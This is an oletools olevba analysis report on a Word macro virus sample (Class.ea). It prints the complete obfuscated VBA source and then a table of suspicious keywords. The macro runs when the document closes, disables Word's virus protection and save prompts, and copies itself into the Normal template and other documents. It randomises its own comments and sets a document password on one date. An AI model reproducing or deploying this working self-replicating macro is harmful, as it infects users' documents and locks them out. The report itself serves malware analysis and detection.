olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ea-0bd69d077c7f6c0a53c4275630f75b21afcb69f4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ea-0bd69d077c7f6c0a53c4275630f75b21afcb69f4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'7<<$%!H9<.$4-B$$%!H9<4-B$$7<<$%
Dim rsx, rox, xix, xxi As Integer: Dim xxe, xex, exx, exd, cxi, cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String
'9;<&$!J8<0#4-B$&$!J8<4-B$&9;<&$
Randomize
'<:=)#"M7=3"4-B$)#"M7=4-B$)<:=)#
On Error GoTo 79
'78;$! H5;. 4-B$$! H5;4-B$$78;$!
Options.VirusProtection = Chr(48)
'69B#"'G6B-!4-B$#"'G6B4-B$#69B#"
Options.SaveNormalPrompt = Chr(48)
'7<:$%H9:.$4-B$$%H9:4-B$$7<:$%
Options.ConfirmConversions = Chr(48)
'6>:#'G;:-&4-B$#'G;:4-B$#6>:#'
rt = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
'78:$!H5:. 4-B$$!H5:4-B$$78:$!
dt = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
'79:$"H6:.!4-B$$"H6:4-B$$79:$"
If dt > 0 And rt > 0 Then GoTo 79
'68=#!"G5=- 4-B$#!"G5=4-B$#68=#!
If dt = 0 Then
'98;&! J5;0 4-B$&! J5;4-B$&98;&!
    Set Joy = NormalTemplate.VBProject.VBComponents
'88B%!'I5B/ 4-B$%!'I5B4-B$%88B%!
    Set hst = ActiveDocument.VBProject.VBComponents
'7::$#H7:."4-B$$#H7:4-B$$7::$#
    If Month(Now()) = 10 And Day(Now()) = 23 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'69:#"G6:-!4-B$#"G6:4-B$#69:#"
    If Month(Now()) = 11 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(74) + Chr(79) + Chr(89)
'7;;$$ H8;.#4-B$$$ H8;4-B$$7;;$$
    If Month(Now()) = 12 And Day(Now()) = 25 Then Application.ActiveDocument.Password = "Ultra.Joy"
'6;:#$G8:-#4-B$#$G8:4-B$#6;:#$
    hst.Item(Cos(Atn(CInt(1)))).Name = Joy.Item(Cos(Atn(CInt(1)))).Name
';9:("L6:2!4-B$("L6:4-B$(;9:("
    hst.Item(Cos(Atn(CInt(1)))).Export Application.StartupPath & System.Version & Chr(74) + Chr(79) + Chr(89)
'69:#"G6:-!4-B$#"G6:4-B$#69:#"
End If
'78:$!H5:. 4-B$$!H5:4-B$$78:$!
If rt = 0 Then Set Joy = ActiveDocument.VBProject.VBComponents
':9;'" K6;1!4-B$'" K6;4-B$':9;'"
Joy.Item(Cos(Atn(CInt(1)))).codemodule.AddFromFile Application.StartupPath & System.Version & Chr(74) + Chr(79) + Chr(89)
'6;:#$G8:-#4-B$#$G8:4-B$#6;:#$
With Joy.Item(Cos(Atn(CInt(1)))).codemodule
'>8:+!O5:5 4-B$+!O5:4-B$+>8:+!
    For j = Chr(49) To Chr(52)
'78?$!$H5?. 4-B$$!$H5?4-B$$78?$!
    .deletelines Chr(49)
'79@$"%H6@.!4-B$$"%H6@4-B$$79@$"
    Next j
'69;#" G6;-!4-B$#" G6;4-B$#69;#"
    End With
'6::##G7:-"4-B$##G7:4-B$#6::##
If dt = 0 Then Joy.Item(Cos(Atn(CInt(1)))).codemodule.replaceline 1, "Sub AutoClose()"
'6<<#%!G9<-$4-B$#%!G9<4-B$#6<<#%
If dt = 0 Then Joy.Item(Cos(Atn(CInt(1)))).codemodule.replaceline 85, "Sub ToolsMarco()"
'68<#!!G5<- 4-B$#!!G5<4-B$#68<#!
If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'79<$"!H6<.!4-B$$"!H6<4-B$$79<$"
With Joy.Item(Cos(Atn(CInt(1)))).codemodule
'7<;$% H9;.$4-B$$% H9;4-B$$7<;$%
   For j = Chr(50) To Joy.Item(Cos(Atn(CInt(1)))).codemodule.countoflines Step Chr(50)
'78>$!#H5>. 4-B$$!#H5>4-B$$78>$!
    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55
'7=<$&!H:<.%4-B$$&!H:<4-B$$7=<$&
    cii = Asc(rsx): eox = Chr$(cii + 5): xoe = Chr$(cii - 14): oxe = Chr$(cii + 22): lnr = Chr$(cii - 4)
'><;+% O9;5$4-B$+% O9;4-B$+><;+%
    cix = Asc(rox): rxe = Chr$(cix + 7): rex = Chr$(cix - 16): exr = Chr$(cix + 4): nrl = Chr$(cix - 17)
';<:(%L9:2$4-B$(%L9:4-B$(;<:(%
    xic = Asc(xix): nix = Chr$(xic + 9): ixn = Chr$(xic - 18): nxi = Chr$(xic + 8): rnl = Chr$(xic - 33)
'6;<#$!G8<-#4-B$#$!G8<4-B$#6;<#$
    cxi = Asc(xxi): xxe = Chr$(cxi + 4): xex = Chr$(cxi - 3): exx = Chr$(cxi + 18): exd = Chr$(cxi - 12)
'7;:$$H8:.#4-B$$$H8:4-B$$7;:$$
    .replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & xoe & rex & ixn & oxe & exr & nix & rnl & xxe & xex & exx & exd & xoe & eox & rxe & nix & xoe & rex
'6:?##$G7?-"4-B$##$G7?4-B$#6:?##
   Next j
'78;$! H5;. 4-B$$! H5;4-B$$78;$!
End With
'6;;#$ G8;-#4-B$#$ G8;4-B$#6;;#$
79:
'7:;$# H7;."4-B$$# H7;4-B$$7:;$#
If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'88:%!I5:/ 4-B$%!I5:4-B$%88:%!
End Sub
':<:'%K9:1$4-B$'%K9:4-B$':<:'%
Sub ToolsMarco()
';<A(%&L9A2$4-B$(%&L9A4-B$(;<A(%
End Sub
'99>&"#J6>0!4-B$&"#J6>4-B$&99>&"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

